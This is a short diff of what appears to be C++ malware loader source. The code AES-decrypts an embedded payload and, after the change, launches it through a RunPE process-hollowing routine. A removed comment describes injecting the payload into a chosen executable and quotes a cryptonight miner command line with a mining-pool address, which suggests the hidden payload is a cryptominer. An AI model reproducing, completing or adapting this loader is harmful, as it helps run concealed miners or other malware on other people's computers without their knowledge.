@@ -64,20 +64,7 @@ void AESDecrypt(std::vector<char> toDecrypt, int size)
 
 void enc()
 {
-	switch (RData.back())
-	{
-	case '1':
-		{
-			std::ofstream out("1.txt");
-		}
-		break;
-	case '2':
-		{
-			AESDecrypt(RData, RData.size());
-		}
-		break;
-	}
-	return;
+	AESDecrypt(RData, RData.size());
 }
 
 
@@ -94,9 +81,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	if (pFile)
 	{
 		GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
-		//replace process.exe with "szFilePath" if you want to inject it in the SAME file.
-		//or you may write the file path you want to inject in.
-		ExecFile(LPSTR(szFilePath), pFile, ""); // "  --donate-level=1 -a cryptonight --url=35.204.135.202:3333 --threads 1 --user=x"
+		NTRX_RUNPE32(pFile);
 	}
 	return 0;
 };
